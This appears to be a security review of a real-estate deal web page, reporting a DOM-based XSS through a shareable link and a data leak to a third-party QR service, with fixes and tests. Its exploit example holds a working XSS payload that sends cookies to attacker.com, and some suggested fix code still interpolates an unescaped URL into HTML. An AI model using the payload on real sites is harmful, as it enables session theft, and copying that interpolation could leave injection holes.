# Security Review & Required Fixes
**Date:** 2026-09-18  
**Branch:** feature/agent-work  
**Status:** ⚠️ **BLOCKING — Fix before distribution**

---

## Overview

Two security vulnerabilities were identified in `index.html`. Both are concrete, exploitable issues that must be fixed before this repository is shared publicly. No hardcoded secrets or credentials were found.

**Blockers:** 2 findings (1 HIGH, 1 MEDIUM)

---

## CRITICAL: Vuln 1 — DOM-based XSS via Shareable `?data=` Link

**Severity:** HIGH  
**File:** `index.html`  
**Lines:** 1237, 1245–1247, 1281  
**Category:** Cross-Site Scripting (XSS)

### The Problem

The `renderAIMemo()` function builds HTML from attacker-controlled deal data without properly escaping numeric fields. An attacker can inject malicious HTML via the `?data=` URL parameter, which is then inserted directly into the DOM via `innerHTML`.

**Vulnerable Code (lines 1210–1282):**
```javascript
function renderAIMemo(d, brokerList) {
  const safeName = escapeHtml(d.name);
  const safeAddress = escapeHtml(d.address);
  // ... other fields correctly escaped ...
  
  const html = `
    <div>
      <div>SF: ${(d.sf || 0).toLocaleString()}</div>                    <!-- UNSAFE: no escapeHtml -->
      <div>${d.clearHeight || 24}' Clear Height</div>                   <!-- UNSAFE: no escapeHtml -->
      <div>${d.dockDoors || 4} Dock Doors</div>                        <!-- UNSAFE: no escapeHtml -->
      <div>${d.driveinDoors || 2} Drive-In Doors</div>                 <!-- UNSAFE: no escapeHtml -->
      <div>${d.courtDepth || 140}' Court Depth</div>                   <!-- UNSAFE: no escapeHtml -->
      <div>${d.trailerStalls || 10} Stalls</div>                       <!-- UNSAFE: no escapeHtml -->
    </div>
  `;
  
  document.getElementById('memo-content').innerHTML = html;              <!-- DANGEROUS: innerHTML with unescaped data -->
}
```

### Exploit Example

1. Attacker creates payload:
```json
{
  "name": "Legitimate Deal",
  "clearHeight": "<img src=x onerror=\"fetch('https://attacker.com/steal?c=' + btoa(document.cookie))\" style=\"display:none\">",
  "dockDoors": 4,
  "sf": 450000
}
```

2. Encodes as base64 and crafts link:
```
https://victim-site.com/index.html?data=eyJuYW1lIjoiTGVnaXRpbWF0ZSBEZWFsIiwi...
```

3. Sends link to victim (email, Slack, etc.)
4. On page load, JavaScript executes without user interaction
5. Attacker steals cookies, localStorage, or modifies deal data

### The Fix

**Option A: Escape individual numeric fields (surgical fix)**

Find the `renderAIMemo()` function and update all numeric field interpolations:

```javascript
function renderAIMemo(d, brokerList) {
  const safeName = escapeHtml(d.name);
  const safeAddress = escapeHtml(d.address);
  const safeCorridor = escapeHtml(d.corridor);
  const safeSprinkler = escapeHtml(d.sprinkler || 'ESFR Sprinkler System');
  const safeGrid = escapeHtml(d.columnGrid || "50' x 50' Speed Bays");
  const safeNotes = escapeHtml(d.notes || 'Institutional industrial asset with prime logistical connectivity.');

  // ADD THESE COERCIONS:
  const safeSf = Number(d.sf) || 0;
  const safeClearHeight = Number(d.clearHeight) || 24;
  const safeDockDoors = Number(d.dockDoors) || 4;
  const safeDriveinDoors = Number(d.driveinDoors) || 2;
  const safeCourtDepth = Number(d.courtDepth) || 140;
  const safeTrailerStalls = Number(d.trailerStalls) || 10;

  const html = `
    <div class="space-y-6">
      <div class="bg-slate-900 border border-slate-800 rounded-2xl p-5 shadow-xl">
        <h3 class="text-xs font-bold uppercase tracking-wider text-slate-200 mb-4">Executive Summary</h3>
        
        <div class="grid grid-cols-2 sm:grid-cols-3 gap-4 mb-6">
          <div class="bg-slate-950/60 p-3 rounded-lg border border-slate-800/80">
            <div class="text-[11px] text-slate-400 uppercase font-semibold">Building Area</div>
            <div class="text-sm font-extrabold text-blue-400 font-mono">${safeSf.toLocaleString()} SF</div>
          </div>
          <div class="bg-slate-950/60 p-3 rounded-lg border border-slate-800/80">
            <div class="text-[11px] text-slate-400 uppercase font-semibold">Clear Height</div>
            <div class="text-sm font-extrabold text-blue-400 font-mono">${safeClearHeight}' Clear</div>
          </div>
          <div class="bg-slate-950/60 p-3 rounded-lg border border-slate-800/80">
            <div class="text-[11px] text-slate-400 uppercase font-semibold">Dock Doors</div>
            <div class="text-sm font-extrabold text-blue-400 font-mono">${safeDockDoors} Doors</div>
          </div>
          <div class="bg-slate-950/60 p-3 rounded-lg border border-slate-800/80">
            <div class="text-[11px] text-slate-400 uppercase font-semibold">Drive-In Doors</div>
            <div class="text-sm font-extrabold text-blue-400 font-mono">${safeDriveinDoors} Ramped</div>
          </div>
          <div class="bg-slate-950/60 p-3 rounded-lg border border-slate-800/80">
            <div class="text-[11px] text-slate-400 uppercase font-semibold">Court Depth</div>
            <div class="text-sm font-extrabold text-blue-400 font-mono">${safeCourtDepth}' Depth</div>
          </div>
          <div class="bg-slate-950/60 p-3 rounded-lg border border-slate-800/80">
            <div class="text-[11px] text-slate-400 uppercase font-semibold">Trailer Stalls</div>
            <div class="text-sm font-extrabold text-blue-400 font-mono">${safeTrailerStalls} Stalls</div>
          </div>
        </div>

        <div class="space-y-3 border-t border-slate-800 pt-4">
          <div>
            <div class="text-xs font-bold text-slate-300 uppercase tracking-wide mb-2">Property Specification</div>
            <div class="text-sm text-slate-300 leading-relaxed">${safeNotes}</div>
          </div>
          ${brokerList}
        </div>
      </div>
    </div>
  `;
  
  document.getElementById('memo-content').innerHTML = html;
}
```

**Option B: Validate/normalize payload at entry point (deeper fix)**

In the `initStorage()` function, after decoding the `?data=` parameter, validate and coerce all numeric fields:

```javascript
function initStorage() {
  // ... existing code ...
  
  // After decoding data parameter:
  if (cloudDeal) {
    // Validate and coerce numeric fields
    cloudDeal.sf = Number(cloudDeal.sf) || 50000;
    cloudDeal.clearHeight = Number(cloudDeal.clearHeight) || 32;
    cloudDeal.dockDoors = Number(cloudDeal.dockDoors) || 4;
    cloudDeal.driveinDoors = Number(cloudDeal.driveinDoors) || 2;
    cloudDeal.courtDepth = Number(cloudDeal.courtDepth) || 140;
    cloudDeal.trailerStalls = Number(cloudDeal.trailerStalls) || 10;
    cloudDeal.costPsf = Number(cloudDeal.costPsf) || 100;
    cloudDeal.rentPsf = Number(cloudDeal.rentPsf) || 7.50;
    cloudDeal.escalation = Number(cloudDeal.escalation) || 3.50;
    cloudDeal.exitCap = Number(cloudDeal.exitCap) || 5.25;
    // ... validate other numeric fields ...
    
    currentDeal = cloudDeal;
  }
}
```

### Testing the Fix

1. **Before:** Navigate to `index.html?data=eyJjbGVhckhlaWdodCI6IjxpbWcgc3JjPXggb25lcnJvcj1jb25zb2xlLmxvZygnWFNTIScpPiJ9` (base64-encoded XSS payload)
   - Open browser DevTools → Console
   - See a security error or console log (XSS fired)

2. **After:** Same URL should either:
   - Show the data as plain text (if escaped), or
   - Ignore the malicious payload (if validated as numeric)
   - No script execution

---

## MEDIUM: Vuln 2 — Data Exposure via Third-Party QR Code Service

**Severity:** MEDIUM  
**File:** `index.html`  
**Line:** ~1357 (in fallback QR generation)  
**Category:** Information Disclosure

### The Problem

When the `qrcodejs` CDN library fails to load (due to network issues, ad-blockers, CSP, or corporate firewalls), the code falls back to rendering a remote QR code from `api.qrserver.com`. The share URL contains base64-encoded confidential deal data (property details, financial terms, broker names/emails/phones), which is sent to and logged by a third-party server.

**Vulnerable Code:**
```javascript
function openQrModal() {
  const shareUrl = getShareableUrl();  // Contains full base64-encoded deal data
  const container = document.getElementById('qrcode-canvas');
  
  // Fallback if qrcodejs fails:
  if (!window.QRCode) {
    container.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(shareUrl)}" alt="QR Code">`;
    // ^ Sends full confidential payload to third party
  }
}
```

### Exploit Scenario

No active attacker needed. Passive data leak:
1. User on corporate network views deal on their laptop
2. CDN for `qrcode.js` is blocked by firewall
3. QR fallback activates automatically
4. Full deal payload (including "Confidential Client Presentation" stamp) is sent to `api.qrserver.com`
5. Third party logs and potentially analyzes deal data

### The Fix

**Option A: Remove remote fallback (recommended)**

Replace the remote fallback with an offline message:

```javascript
function openQrModal() {
  const shareUrl = getShareableUrl();
  const container = document.getElementById('qrcode-canvas');
  
  if (!window.QRCode) {
    // Fallback: show copy-link button instead of leaking to third party
    container.innerHTML = `
      <div class="flex flex-col items-center justify-center min-h-[300px] gap-4 p-4">
        <div class="text-sm text-slate-300 text-center">
          <p class="font-semibold mb-2">QR Code Unavailable</p>
          <p class="text-xs text-slate-400">Copy the link below instead:</p>
        </div>
        <div class="w-full max-w-sm">
          <input type="text" value="${shareUrl}" readonly class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded text-xs text-slate-200 font-mono" id="share-link-fallback">
        </div>
        <button onclick="document.getElementById('share-link-fallback').select(); document.execCommand('copy');" class="px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white text-xs font-semibold rounded">
          Copy Link
        </button>
      </div>
    `;
    return;
  }
  
  // Normal QR generation path (qrcodejs available)
  container.innerHTML = '';
  new QRCode(container, { text: shareUrl, width: 200, height: 200 });
}
```

**Option B: Bundle a local QR library**

Include a minified QR library inline to avoid CDN dependency:

```javascript
// At the top of the script section, add a lightweight QR encoder (e.g., qrcode.js bundled)
// Then use it without relying on external CDN
function openQrModal() {
  const shareUrl = getShareableUrl();
  const container = document.getElementById('qrcode-canvas');
  container.innerHTML = '';
  
  // Use local bundled QRCode (no remote fallback)
  try {
    new QRCode(container, { text: shareUrl, width: 200, height: 200 });
  } catch (e) {
    // Graceful degradation: show error + copy button
    container.innerHTML = `
      <div class="flex items-center justify-center min-h-[300px] text-slate-400 text-xs">
        <div class="text-center">
          <p class="mb-3">Unable to generate QR code.</p>
          <button onclick="navigator.clipboard.writeText('${shareUrl}'); alert('Link copied!');" class="px-3 py-2 bg-slate-800 hover:bg-slate-700 rounded text-blue-400">
            Copy Share Link
          </button>
        </div>
      </div>
    `;
  }
}
```

### Testing the Fix

1. **Simulate CDN failure** (DevTools → Network → throttle, or block `qrcodejs` CDN in hosts file)
2. **Click QR Code button**
3. **Verify:** Either QR renders locally, or fallback shows copy-link button (no network request to `api.qrserver.com`)
4. **Check DevTools → Network tab** — no request to `api.qrserver.com` should appear

---

## Implementation Checklist

- [ ] **Vuln 1 Fix:** Apply escapeHtml coercions or payload validation (Option A or B)
- [ ] **Vuln 1 Test:** Load `index.html?data=<xss-payload>` and confirm no script execution
- [ ] **Vuln 2 Fix:** Remove remote QR fallback or bundle local library (Option A or B)
- [ ] **Vuln 2 Test:** Block qrcodejs CDN and confirm fallback is offline-only
- [ ] **Commit:** `git commit -am "Security: fix XSS and data-exposure vulnerabilities"`
- [ ] **Verify:** `git log` shows clean commit, `git status` is clean
- [ ] **Ready:** Repo is now safe to share and distribute

---

## Summary of Other Findings

✅ **Passed Security Checks:**
- Path traversal (server.js slug validation is solid)
- URL sanitization (`sanitizeUrl()` correctly blocks unsafe schemes)
- Broker data handling (properly escaped)
- No hardcoded secrets or credentials
- localStorage handling is safe
- `.gitignore` is configured correctly
- Test artifacts contain no sensitive data

---

## References

- [OWASP: Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [OWASP: Sensitive Data Exposure](https://owasp.org/www-project-top-ten/)
- [MDN: innerHTML security](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations)

---

**Status after fixes:** ✅ Ready for public distribution
